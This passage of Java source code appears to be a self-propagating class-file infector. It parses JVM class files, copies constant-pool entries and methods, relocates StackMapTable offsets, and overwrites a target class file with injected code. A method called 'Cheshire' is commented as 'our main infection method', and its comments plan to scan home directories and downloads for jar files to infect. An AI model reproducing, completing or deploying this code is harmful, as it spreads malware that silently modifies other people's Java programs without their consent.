                length = instructionIndex(pc_length, (ArrayList<byte[]>) origin.get(""method_code""),(ArrayList<byte[]>) destination.get(""method_code"")) - start_pc;
                b.putShort((short) length);
                int orig_name_index = buffer.getShort();
                int[] indices = LVT.get(getUtf8Constant(orig_name_index, origin));
                int new_name_index = (short) indices[0];
                b.putShort((short) indices[0]);
                int orig_descriptor_index = buffer.getShort();
                int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
                b.putShort((short) indices[1]);
                b.putShort(buffer.getShort());
            }
            return b.array();
        }
        else if(type.equals(""Signature"")){
            int old_signature_index = buffer.getShort();
            int new_signature_index = copyConstant(origin, old_signature_index, destination);
            b.putShort((short) new_signature_index);
            return b.array();
        }
        else if(type.equals(""Exceptions"")){
            int number_of_exceptions = buffer.getShort();
            b.putShort((short) number_of_exceptions);
            for(int i = 0; i < number_of_exceptions; i++){
                int class_index = buffer.getShort();
                int new_class_index = copyConstant(origin, class_index, destination);
                b.putShort((short) new_class_index);
            }
            return b.array();
        }
        else if(type.equals(""StackMapTable"")){
            int num_entries = buffer.getShort();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            int frame_position = 0;
            int old_frame_position = 0;
            for(int i = 0; i < num_entries; i++){

                byte tagbyte = buffer.get();
                int tag = tagbyte & 0xFF;

                if(tag >= 0 && tag <= 63){
                    int new_offset =  instructionIndex(old_frame_position + tag + i, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code"")) - (frame_position +i);
                    old_frame_position += tag;

                    Integer a = new_offset;
                    byte newtag = a.byteValue();
                    bos.write(newtag);

                    frame_position += new_offset;

                }
                else if(tag >= 64 && tag <= 127){

                    int new_offset = instructionIndex(old_frame_position + (tag - 64) + i, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code"")) - (frame_position+i);

                    old_frame_position += (tag - 64);

                    byte newtag = (byte) (new_offset+64);
                    bos.write(newtag);
                    try {
                        bos.write(processVerificationTypeInfo(buffer, origin, destination));
                    }
                    catch (IOException e){

                    }
                    frame_position += new_offset;

                }
                else if(tag == 247){
                    bos.write(tagbyte);
                    ByteBuffer bbuf = ByteBuffer.allocate(2);
                    int offset = buffer.getShort();
                    int new_offset = instructionIndex(old_frame_position + offset + i, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code"")) - (frame_position+i);

                    old_frame_position += offset;

                    bbuf.putShort((short) new_offset);
                    try {
                        bos.write(bbuf.array());
                        bos.write(processVerificationTypeInfo(buffer, origin, destination));
                    }
                    catch (IOException e){

                    }

                    frame_position += new_offset;

                }
                else if(tag >= 248 && tag <= 251){
                    bos.write(tagbyte);
                    int offset = buffer.getShort();
                    int new_offset = instructionIndex(old_frame_position + offset + i, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code"")) - (frame_position+i);
                    old_frame_position += offset;
                    ByteBuffer bbuf = ByteBuffer.allocate(2);

                    bbuf.putShort((short) new_offset);

                    try {
                        bos.write(bbuf.array());
                    }
                    catch (IOException e){

                    }

                    frame_position += new_offset;

                }
                else if(tag >= 252 && tag <= 254){
                    bos.write(tagbyte);
                    ByteBuffer bbuf = ByteBuffer.allocate(2);
                    byte[] offset = new byte[2];
                    int o_offset = buffer.getShort();
                    int offset_i = instructionIndex(o_offset + old_frame_position + i, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code"")) - (frame_position+i);

                    old_frame_position += o_offset;


                    bbuf.putShort((short) offset_i);

                    try {
                        bos.write(bbuf.array());
                        int numtypes = tag - 251;
                        for(int a = 0; a < numtypes; a++) {
                            bos.write(processVerificationTypeInfo(buffer, origin, destination));
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    frame_position += offset_i;



                }
                else if(tag == 255){
                    bos.write(tagbyte);
                    byte[] offset = new byte[2];
                    int offset_int = buffer.getShort();
                    int new_offset = instructionIndex(old_frame_position + offset_int + i, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code"")) - (frame_position+i);
                    old_frame_position += offset_int;


                    ByteBuffer bbuf = ByteBuffer.allocate(2);
                    bbuf.putShort((short) new_offset);

                    try {
                        bos.write(bbuf.array());
                        int num_locals = buffer.getShort();
                        bbuf = ByteBuffer.allocate(2);
                        bbuf.putShort((short) num_locals);
                        bos.write(bbuf.array());
                        for(int a = 0; a < num_locals; a++){
                            bos.write(processVerificationTypeInfo(buffer, origin, destination));
                        }
                        int num_stack_items = buffer.getShort();
                        bbuf = ByteBuffer.allocate(2);
                        bbuf.putShort((short) num_stack_items);
                        bos.write(bbuf.array());
                        for(int a= 0; a < num_stack_items; a++){
                            bos.write(processVerificationTypeInfo(buffer, origin, destination));
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    frame_position += new_offset;

                }
            }
            b.putShort((short) num_entries);
            b.put(bos.toByteArray());
            return b.array();
        }
        else if(type.equals(""LineNumberTable"")){
            int table_length = buffer.getShort();
            b.putShort((short) table_length);
            for(int i = 0; i < table_length; i++){
                b.putShort((short) (i+1));
                buffer.getShort();
                b.putShort(buffer.getShort());
        }
        return b.array();
    }
        return buffer.array();
}

    /**
     * Easily turn a Utf8 String index into a string we can read.
     * @param index
     * @param parsedClass
     * @return
     */
    public static String getUtf8Constant(int index, HashMap<String, Object> parsedClass){
        byte[][] constant_pool = (byte[][]) parsedClass.get(""constant_pool"");
        byte[] constant = constant_pool[index-1];
        return new String(Arrays.copyOfRange(constant, 3, constant.length));
    }

    /**
     * Pass a set of bytes in a class, return the name of the method.
     * @param method
     * @param parsedClass
     * @return
     */
    public static String getMethodName(byte[] method, HashMap<String, Object> parsedClass){
        ByteBuffer method_buffer = ByteBuffer.wrap(method);
        method_buffer.get(new byte[2]);
        int name_index = method_buffer.getShort();
        return getUtf8Constant(name_index, parsedClass);
    }

    /**
     *
     * Copy a method from one parsed class to another.
     * If the method already exists, overwrite it. This is because I'm lazy and didn't want to write a
     * separate method for handling injection.
     * @param parsedClass
     * @param orig_method_index
     * @param destination
     * @return The index of the method in the new file
     *
     */
    public static int copyMethod(HashMap<String, Object> origin, int orig_method_index, HashMap<String, Object> destination) throws IOException {
        byte[][] orig_methods = (byte[][]) origin.get(""methods"");
        byte[] method = orig_methods[orig_method_index];
        boolean overwrite = false;

        String methodName = getMethodName(method, origin);
        ByteBuffer method_buffer = ByteBuffer.wrap(method);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ByteBuffer b = ByteBuffer.allocate(8);
        byte[] access_flags = new byte[2];
        method_buffer.get(access_flags);
        b.put(access_flags);
        int orig_name_index = method_buffer.getShort();
        int new_name_index = copyConstant(origin, orig_name_index, destination);
        b.putShort((short) new_name_index);

        int orig_descriptor_index = method_buffer.getShort();
        int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
        b.putShort((short) new_descriptor_index);

        int attribute_count = method_buffer.getShort();
        b.putShort((short) attribute_count);
        bos.write(b.array());
        b.clear();
        HashMap<Integer, Integer> offsets = new HashMap<Integer, Integer>();
        origin.put(""method_offsets"", offsets);

        for(int i = 0; i < attribute_count; i++){
            b = ByteBuffer.allocate(6);
            int old_name_index = method_buffer.getShort();
            int new_attr_name_index = copyConstant(origin, old_name_index, destination);

            int attribute_length = method_buffer.getInt();
            byte[][] cpool = (byte[][]) origin.get(""constant_pool"");

            byte[] attr_name_bytes = cpool[old_name_index-1];
            String name = getUtf8Constant(old_name_index, origin);

            byte[] attribute = new byte[attribute_length];
            method_buffer.get(attribute);

            byte[] new_attribute = processAttribute(attribute, origin, destination, name);

            b.putShort((short) new_attr_name_index);
            b.putInt(new_attribute.length);
            bos.write(b.array());
            bos.write(new_attribute);


        }
        byte[][] dest_methods = (byte[][]) destination.get(""methods"");
        byte[][] temp_new_methods = new byte[dest_methods.length+1][];

        for(int a = 0; a < dest_methods.length; a++){
            if(methodName.equals(getMethodName(dest_methods[a], destination))){
                overwrite = true;
            }
        }
        if(overwrite == true){
            temp_new_methods = new byte[dest_methods.length][];
            for(int a = 0; a < dest_methods.length; a++){
                if(methodName.equals(getMethodName(dest_methods[a], destination))){
                    temp_new_methods[a] =  bos.toByteArray();
                }
                else{
                    temp_new_methods[a] = dest_methods[a];
                }
            }
        }
        else{
            for(int a = 0; a < dest_methods.length; a++){
                temp_new_methods[a] = dest_methods[a];
            }
            temp_new_methods[dest_methods.length] = bos.toByteArray();
        }
        destination.put(""methods"", temp_new_methods);
        return dest_methods.length+1;
    }

    /**
     * Add an item to the constant pool.
     */
    public static int addToPool(HashMap<String, Object> parsedClass, byte[] new_data){
        byte[][] target_constant_pool = (byte[][]) parsedClass.get(""constant_pool"");
        int pool_size = target_constant_pool.length+1;
        byte[][] temp_target_pool = new byte[pool_size][];
        for(int a = 0; a < pool_size-1; a++){
            temp_target_pool[a] = target_constant_pool[a];
        }
        temp_target_pool[pool_size-1] = new_data;
        parsedClass.put(""constant_pool"", temp_target_pool);
        return pool_size;
    }

    /**
     * Get a class's name as a String based on the name of this_class.
     * @param parsedClass
     * @return
     */
    public static String getClassName(HashMap<String, Object> parsedClass){
        byte[] selfClassBytes = (byte[]) parsedClass.get(""this_class"");
        byte[][] constant_pool = (byte[][]) parsedClass.get(""constant_pool"");
        ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
        int self_class_index = selfBytes.getShort();
        byte[] selfClass = constant_pool[self_class_index-1];
        ByteBuffer selfClassBuff = ByteBuffer.wrap(selfClass);
        selfClassBuff.get();
        int classNameIndex = selfClassBuff.getShort();
        return getUtf8Constant(classNameIndex, parsedClass);
    }

    /**
     * Let's think about how we're doing this...
     *
     * Ideally we want to pass in the original constant index, copy the data, place it in the target
     * and return the new index. This makes copying methods easier when it comes to the attributes.
     *
     * @return The new index of the copied constant
     */
   public static int copyConstant(HashMap<String, Object> origin, int origin_index, HashMap<String, Object> destination){
       byte[][] constant_pool = (byte[][]) origin.get(""constant_pool"");
       byte[] orig_constant = constant_pool[origin_index-1];

       //Create a map between the old and new constant pools
       //This will help us avoid copying too many vars over and being wasteful
       if(origin.get(""constant_pool_map"") == null){
           HashMap<Integer, Integer> constant_pool_map = new HashMap<Integer, Integer>();
           origin.put(""constant_pool_map"", constant_pool_map);
       }
       HashMap<Integer, Integer> constant_pool_map = (HashMap<Integer, Integer>) origin.get(""constant_pool_map"");
       if(constant_pool_map.keySet().contains(origin_index)){
           return constant_pool_map.get(origin_index);
       }
       int const_tag = orig_constant[0];
       if(const_tag == 1){
           int new_index = addToPool(destination, orig_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 7){
           ByteBuffer b = ByteBuffer.allocate(3);
           int orig_name_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_name_index = copyConstant(origin, orig_name_index, destination);
           b.put(orig_constant[0]);
           b.putShort((short) new_name_index);
           byte[] new_constant = b.array();
           int new_index;
           if(getClassName(origin).equals(getUtf8Constant(orig_name_index, origin))){
               byte[] selfClassBytes = (byte[]) destination.get(""this_class"");
               ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
               new_index = selfBytes.getShort();
           }
           else{
               new_index = addToPool(destination, new_constant);
               constant_pool_map.put(origin_index, new_index);
           }
           return new_index;
       }
       else if(const_tag == 9 || const_tag == 10 || const_tag == 11){
           ByteBuffer b = ByteBuffer.allocate(5);
           int orig_class_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_class_index = copyConstant(origin, orig_class_index, destination);
           String thisClass = getClassName(origin);
           byte[] methodClassBytes = constant_pool[orig_class_index-1];
           ByteBuffer methodClassBuffer = ByteBuffer.wrap(methodClassBytes);
           methodClassBuffer.get();
           int classNameIndex = methodClassBuffer.getShort();
           String methodClassName = getUtf8Constant(classNameIndex, origin);
           if(methodClassName.equals(getClassName(origin))){
               byte[] selfClassBytes = (byte[]) destination.get(""this_class"");
               byte[][] t_constant_pool = (byte[][]) destination.get(""constant_pool"");
               ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
               new_class_index = selfBytes.getShort();
           }
           b.put(orig_constant[0]);
           b.putShort((short) new_class_index);
           int orig_name_and_type_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
           int new_name_and_type_index = copyConstant(origin, orig_name_and_type_index, destination);
           b.putShort((short) new_name_and_type_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 8){
           ByteBuffer b = ByteBuffer.allocate(3);
           b.put(orig_constant[0]);
           int orig_string_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_string_index = copyConstant(origin, orig_string_index, destination);
           b.putShort((short) new_string_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;

       }
       else if(const_tag == 3 || const_tag == 4 || const_tag == 5 || const_tag == 6){
           int new_index = addToPool(destination, orig_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 12){
           ByteBuffer b = ByteBuffer.allocate(5);
           b.put(orig_constant[0]);
           int orig_name_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_name_index = copyConstant(origin, orig_name_index, destination);
           b.putShort((short) new_name_index);
           int orig_descriptor_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
           int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
           b.putShort((short) new_descriptor_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 15){
           ByteBuffer b = ByteBuffer.allocate(4);
           b.put(orig_constant[0]);
           b.put(orig_constant[1]);
           int old_reference_index = (short) (((orig_constant[2] & 0xFF) << 8) | (orig_constant[3] & 0xFF));
           int new_reference_index = copyConstant(origin, old_reference_index, destination);
           b.putShort((short) new_reference_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 16){
           ByteBuffer b = ByteBuffer.allocate(3);
           b.put(orig_constant[0]);
           int orig_descriptor_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
           b.putShort((short) new_descriptor_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 18){
           ByteBuffer b = ByteBuffer.allocate(5);
           b.put(orig_constant[0]);
           b.put(orig_constant[1]);
           b.put(orig_constant[2]);
           int orig_name_and_type_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
           int new_name_and_type_index = copyConstant(origin, orig_name_and_type_index, destination);
           b.putShort((short) new_name_and_type_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else{
           return -1;
       }
   }

    /**
     * Find jar files given a directory
     * @param f
     * @return
     */
    public static void searchFile(File file, ArrayList<File> fileList) {
        File[] files = file.listFiles();
        if (files != null) {
            for (File f : file.listFiles()) {
                if (f.isFile() && f.getName().endsWith("".jar"")) {
                    System.out.println(""Added "" + f.getAbsolutePath());
                    fileList.add(f);
                } else if (f.isDirectory() && f.canRead()) {
                    searchFile(f, fileList);
                }
            }
        }

    }
    /**
     * This is our main infection method.
     * We need to determine the target classfile name when we're copying this
     * because you can't figure out what class you're in while you're using a
     * static method. Can't call a method without a class unless the method is
     * statis, so we're at a bit of a catch-22. The solution is simple to hardcode
     * the class in the propagated bytecode.
     *
     * We need to know if we can just inject static methods or not. It seems like either
     * way you'd still need to change the constant pool.
     */
    public static void Cheshire() throws IOException {
        System.out.println(""We're all mad down here...you may notice that I'm not all there myself."");

        /**
         * What logic do we want to implement?
         * Search folders for jar files, open them, look for main classes and infect?
         * Sounds good. How do we get our current path? Also need to know if on Linux or Windows.
         * Scan user dirs, home folders, downloads and look for running Java processes if on applicable version.
         */
        String h = MethodHandles.lookup().lookupClass().getResource(MethodHandles.lookup().lookupClass().getName() + "".class"").getPath();
        System.out.println(h);
        String selfpath = SelfExamine.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace(""file:"", """") + ""SelfExamine.class"";
        System.out.println(selfpath);
        String OS = (String) System.getProperties().get(""os.name"");
        String homedir = (String) System.getProperties().get(""user.home"");
        File home = new File(homedir);
        File fa = new File(""dongs.txt"");
        fa.createNewFile();


        System.out.println(""Detected OS is "" + OS);
        System.out.println(""Home directory is "" + homedir);
        File f = new File(""."");
        System.out.println(""Absolute path:"" + f.getAbsolutePath());
        System.out.println(""Directory listing:"");

        for(String s : f.list()){
            System.out.println(s);
        }
        System.out.println(f.list());
        selfpath = selfpath.substring(1);
        HashMap<String, Object> parsedClass = parseClassFile(selfpath);
        HashMap<String, Object> goatClass = parseClassFile(""C:\\Users\\Mike\\Desktop\\VirtualMachineTest.class"");
        findOurMethods(parsedClass, goatClass);
        inject(parsedClass, goatClass);

        FileOutputStream fos = new FileOutputStream(new File(""C:\\Users\\Mike\\Desktop\\VirtualMachineTest.class""));
        byte[] classbytes = classBytes(goatClass);
        fos.write(classbytes);
        fos.close();

    }

    /**
     * Return a hashmap with all of our shit in it.
     * We want to break this down into a hashmap of the sections
     * with maybe an arraylist of...objects? How do we keep the complexity low?
     * Store them as bytes? Do I even need to write a full parser? Probably not.
     *
     *
     * @param classfilepath
     * @return
     * @throws IOException
     */
    public static HashMap<String, Object> parseClassFile(String classfilepath) {
        try {

            Paths.get(classfilepath);
            byte[] classbytes = Files.readAllBytes(Paths.get(classfilepath));

            DataInputStream dis = new DataInputStream(new ByteArrayInputStream(classbytes));
            byte[] magic = new byte[4];

            HashMap<String, Object> parsedClass = new HashMap<String, Object>();
            dis.read(magic);
            StringBuilder sb = new StringBuilder();

            for (byte b : magic) {
                sb.append(String.format(""%02X"", b));
            }

            if (sb.toString().equals(""CAFEBABE"")) {
                parsedClass.put(""magic"", magic);
                byte[] minor_version = new byte[2];
                dis.read(minor_version);
                parsedClass.put(""minor_version"", minor_version);
                byte[] major_version = new byte[2];
                dis.read(major_version);
                parsedClass.put(""major_version"", major_version);
                byte[] constant_pool_count = new byte[2];
                dis.read(constant_pool_count);
                parsedClass.put(""constant_pool_count"", constant_pool_count);
                int constant_count_int = (short) (((constant_pool_count[0] & 0xFF) << 8) | (constant_pool_count[1] & 0xFF));
                byte[][] constant_pool = new byte[constant_count_int-1][];

                for (int i = 0; i < constant_count_int-1; i++) {

                    byte tagbyte = dis.readByte();
                    int tag = tagbyte;

                    if (tag == 7) {
                        // CONSTANT_Class_info
                        byte[] class_info_bytes = new byte[3];
                        class_info_bytes[0] = tagbyte;
                        class_info_bytes[1] = dis.readByte();
                        class_info_bytes[2] = dis.readByte();
                        constant_pool[i] = class_info_bytes;
                    } else if (tag == 9) {
                        //Constant_Fieldref
                        byte[] fieldref_info_bytes = new byte[5];
                        fieldref_info_bytes[0] = tagbyte;
                        fieldref_info_bytes[1] = dis.readByte();
                        fieldref_info_bytes[2] = dis.readByte();
                        fieldref_info_bytes[3] = dis.readByte();
                        fieldref_info_bytes[4] = dis.readByte();
                        constant_pool[i] = fieldref_info_bytes;
                    } else if (tag == 10) {
                        //Constant_Methodref
                        byte[] methodref_info_bytes = new byte[5];
                        methodref_info_bytes[0] = tagbyte;
                        methodref_info_bytes[1] = dis.readByte();
                        methodref_info_bytes[2] = dis.readByte();
                        methodref_info_bytes[3] = dis.readByte();
                        methodref_info_bytes[4] = dis.readByte();
                        constant_pool[i] = methodref_info_bytes;
                    } else if (tag == 11) {
                        //Constant_InterfaceMethodref
                        byte[] interfacemethodref_info_bytes = new byte[5];
                        interfacemethodref_info_bytes[0] = tagbyte;
                        interfacemethodref_info_bytes[1] = dis.readByte();
                        interfacemethodref_info_bytes[2] = dis.readByte();
                        interfacemethodref_info_bytes[3] = dis.readByte();
                        interfacemethodref_info_bytes[4] = dis.readByte();
                        constant_pool[i] = interfacemethodref_info_bytes;
                    } else if (tag == 8) {
                        //Constant_String
                        byte[] string_info_bytes = new byte[3];
                        string_info_bytes[0] = tagbyte;
                        string_info_bytes[1] = dis.readByte();
                        string_info_bytes[2] = dis.readByte();
                        constant_pool[i] = string_info_bytes;
                    } else if (tag == 3) {
                        //Constant_Integer
                        byte[] integer_info_bytes = new byte[5];
                        integer_info_bytes[0] = tagbyte;
                        integer_info_bytes[1] = dis.readByte();
                        integer_info_bytes[2] = dis.readByte();
                        integer_info_bytes[3] = dis.readByte();
                        integer_info_bytes[4] = dis.readByte();
                        constant_pool[i] = integer_info_bytes;
                    } else if (tag == 4) {
                        //Constant_Float
                        byte[] float_info_bytes = new byte[5];
                        float_info_bytes[0] = tagbyte;
                        float_info_bytes[1] = dis.readByte();
                        float_info_bytes[2] = dis.readByte();
                        float_info_bytes[3] = dis.readByte();
                        float_info_bytes[4] = dis.readByte();
                        constant_pool[i] = float_info_bytes;
                    } else if (tag == 5) {
                        //Constant_Long
                        byte[] long_info_bytes = new byte[9];
                        long_info_bytes[0] = tagbyte;
                        long_info_bytes[1] = dis.readByte();
                        long_info_bytes[2] = dis.readByte();
                        long_info_bytes[3] = dis.readByte();
                        long_info_bytes[4] = dis.readByte();
                        long_info_bytes[5] = dis.readByte();
                        long_info_bytes[6] = dis.readByte();
                        long_info_bytes[7] = dis.readByte();
                        long_info_bytes[8] = dis.readByte();
                        constant_pool[i] = long_info_bytes;
                    } else if (tag == 6) {
                        //Constant_Double
                        byte[] double_info_bytes = new byte[9];
                        double_info_bytes[0] = tagbyte;
                        double_info_bytes[1] = dis.readByte();
                        double_info_bytes[2] = dis.readByte();
                        double_info_bytes[3] = dis.readByte();
                        double_info_bytes[4] = dis.readByte();
                        double_info_bytes[5] = dis.readByte();
                        double_info_bytes[6] = dis.readByte();
                        double_info_bytes[7] = dis.readByte();
                        double_info_bytes[8] = dis.readByte();
                        constant_pool[i] = double_info_bytes;
                    } else if (tag == 12) {
                        //Constant_NameAndType
                        byte[] nameandtype_info_bytes = new byte[5];
                        nameandtype_info_bytes[0] = tagbyte;
                        nameandtype_info_bytes[1] = dis.readByte();
                        nameandtype_info_bytes[2] = dis.readByte();
                        nameandtype_info_bytes[3] = dis.readByte();
                        nameandtype_info_bytes[4] = dis.readByte();
                        constant_pool[i] = nameandtype_info_bytes;
                    } else if (tag == 1) {
                        //Constant_Utf8
                        byte[] lengthbytes = new byte[2];
                        lengthbytes[0] = dis.readByte();
                        lengthbytes[1] = dis.readByte();
                        int length = (short) (((lengthbytes[0] & 0xFF) << 8) | (lengthbytes[1] & 0xFF));
                        byte[] utf_bytes = new byte[3 + length];
                        utf_bytes[0] = tagbyte;
                        utf_bytes[1] = lengthbytes[0];
                        utf_bytes[2] = lengthbytes[1];
                        for (int a = 0; a < length; a++) {
                            utf_bytes[a + 3] = dis.readByte();
                        }
                        constant_pool[i] = utf_bytes;
                    } else if (tag == 15) {
                        //Constant_MethodHandle
                        byte[] methodhandle_info_bytes = new byte[4];
                        methodhandle_info_bytes[0] = tagbyte;
                        methodhandle_info_bytes[1] = dis.readByte();
                        methodhandle_info_bytes[2] = dis.readByte();
                        methodhandle_info_bytes[3] = dis.readByte();
                        constant_pool[i] = methodhandle_info_bytes;
                    } else if (tag == 16) {
                        //Constant_MethodType
                        byte[] methodtype_info_bytes = new byte[3];
                        methodtype_info_bytes[0] = tagbyte;
                        methodtype_info_bytes[1] = dis.readByte();
                        methodtype_info_bytes[2] = dis.readByte();
                        constant_pool[i] = methodtype_info_bytes;
                    } else if (tag == 18) {
                        //Constant_InvokeDynamic
                        byte[] invokedynamic_info_bytes = new byte[5];
                        invokedynamic_info_bytes[0] = tagbyte;
                        invokedynamic_info_bytes[1] = dis.readByte();
                        invokedynamic_info_bytes[2] = dis.readByte();
                        invokedynamic_info_bytes[3] = dis.readByte();
                        invokedynamic_info_bytes[4] = dis.readByte();
                        constant_pool[i] = invokedynamic_info_bytes;
                    } else {
                    }

                }
                parsedClass.put(""constant_pool"", constant_pool);
                byte[] access_flags = new byte[2];
                dis.read(access_flags);
                parsedClass.put(""access_flags"", access_flags);
                byte[] this_class = new byte[2];
                dis.read(this_class);
                parsedClass.put(""this_class"", this_class);
                byte[] super_class = new byte[2];
                dis.read(super_class);
                parsedClass.put(""super_class"", super_class);
                byte[] interfaces_count = new byte[2];
                dis.read(interfaces_count);
                parsedClass.put(""interfaces_count"", interfaces_count);

                int iface_count = (short) (((interfaces_count[0] & 0xFF) << 8) | (interfaces_count[1] & 0xFF));
                byte[][] interfaces = new byte[iface_count][];

                for (int iface_loop = 0; iface_loop < iface_count; iface_loop++) {
                    byte[] iface = new byte[2];
                    iface[0] = dis.readByte();
                    iface[1] = dis.readByte();
                    interfaces[iface_loop] = iface;
                }

                parsedClass.put(""interfaces"", interfaces);

                byte[] fields_count = new byte[2];
                dis.read(fields_count);
                parsedClass.put(""fields_count"", fields_count);
                int f_count = (short) (((fields_count[0] & 0xFF) << 8) | (fields_count[1] & 0xFF));

                byte[][] fields = new byte[f_count][];

                for (int fields_loop = 0; fields_loop < f_count; fields_loop++) {
                    ByteArrayOutputStream field = new ByteArrayOutputStream();
                    byte[] fieldfixed = new byte[8];
                    dis.read(fieldfixed);
                    field.write(fieldfixed);
                    int attributes_count = (short) (((fieldfixed[6] & 0xFF) << 8) | (fieldfixed[7] & 0xFF));
                    for (int attributes = 0; attributes < attributes_count; attributes++) {
                        ByteArrayOutputStream attribute = new ByteArrayOutputStream();
                        byte[] attribute_name_index = new byte[2];
                        byte[] attribute_length = new byte[4];
                        dis.read(attribute_name_index);
                        dis.read(attribute_length);
                        int attribute_len = ByteBuffer.wrap(attribute_length).getInt();
                        byte[] info = new byte[attribute_len];
                        dis.read(info);
                        attribute.write(attribute_name_index);
                        attribute.write(attribute_length);
                        attribute.write(info);
                        field.write(attribute.toByteArray());
                    }
                    fields[fields_loop] = field.toByteArray();
                }

                parsedClass.put(""fields"", fields);

                byte[] methods_count = new byte[2];
                dis.read(methods_count);

                parsedClass.put(""methods_count"", methods_count);

                int method_count = (short) (((methods_count[0] & 0xFF) << 8) | (methods_count[1] & 0xFF));

                byte[][] methods = new byte[method_count][];

                for (int methods_loop = 0; methods_loop < method_count; methods_loop++) {
                    ByteArrayOutputStream methodbytes = new ByteArrayOutputStream();
                    byte[] methodfixed = new byte[8];
                    dis.read(methodfixed);
                    int attribute_count = (short) (((methodfixed[6] & 0xFF) << 8) | (methodfixed[7] & 0xFF));
                    ByteArrayOutputStream method_attributes = new ByteArrayOutputStream();

                    for (int attribute_loop = 0; attribute_loop < attribute_count; attribute_loop++) {
                        ByteArrayOutputStream attribute = new ByteArrayOutputStream();
                        byte[] attribute_name_index = new byte[2];
                        byte[] attribute_length = new byte[4];
                        dis.read(attribute_name_index);
                        dis.read(attribute_length);
                        int attribute_length_int = ByteBuffer.wrap(attribute_length).getInt();
                        byte[] attribute_bytes = new byte[attribute_length_int];
                        dis.read(attribute_bytes);
                        attribute.write(attribute_name_index);
                        attribute.write(attribute_length);
                        attribute.write(attribute_bytes);
                        method_attributes.write(attribute.toByteArray());
                    }
                    methodbytes.write(methodfixed);
                    methodbytes.write(method_attributes.toByteArray());
                    methods[methods_loop] = methodbytes.toByteArray();
                }
                parsedClass.put(""methods"", methods);

                byte[] attributes_count = new byte[2];

                dis.read(attributes_count);

                parsedClass.put(""attributes_count"", attributes_count);

                int attribute_count = (short) (((attributes_count[0] & 0xFF) << 8) | (attributes_count[1] & 0xFF));

                byte[][] attributes = new byte[attribute_count][];

                for (int attribute_loop = 0; attribute_loop < attribute_count; attribute_loop++) {
                    ByteArrayOutputStream attribute = new ByteArrayOutputStream();
                    byte[] attribute_name_index = new byte[2];
                    byte[] attribute_length = new byte[4];
                    dis.read(attribute_name_index);
                    dis.read(attribute_length);
                    attribute.write(attribute_name_index);
                    attribute.write(attribute_length);
                    int attribute_length_int = ByteBuffer.wrap(attribute_length).getInt();
                    byte[] attribute_bytes = new byte[attribute_length_int];
                    dis.read(attribute_bytes);
                    attribute.write(attribute_bytes);
                    attributes[attribute_loop] = attribute.toByteArray();
                }
                parsedClass.put(""attributes"", attributes);
                dis.close();
                //fis.close();
                return parsedClass;

            } else {
                return null;
            }
        }
        catch(IOException e){
            e.printStackTrace();
        }
        return null;
    };

    /**
     * Convert a manipulated class back to bytes for writing.
     * @param parsedClass
     * @return
     * @throws IOException
     */
    public static byte[] classBytes(HashMap<String, Object> parsedClass) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bos.write((byte[]) parsedClass.get(""magic""));
        bos.write((byte[]) parsedClass.get(""minor_version""));
        bos.write((byte[]) parsedClass.get(""major_version""));
        byte[][] constant_pool = (byte[][]) parsedClass.get(""constant_pool"");
        int cp_length = constant_pool.length + 1;

        ByteBuffer b = ByteBuffer.allocate(2);
        b.putShort((short) cp_length);
        byte[] cp_length_bytes = b.array();
        bos.write(cp_length_bytes);

        for(int i = 0; i < constant_pool.length; i++){
            bos.write(constant_pool[i]);
        }
        bos.write((byte[]) parsedClass.get(""access_flags""));
        bos.write((byte[]) parsedClass.get(""this_class""));
        bos.write((byte[]) parsedClass.get(""super_class""));
        bos.write((byte[]) parsedClass.get(""interfaces_count""));
        byte[][] interfaces = (byte[][]) parsedClass.get(""interfaces"");
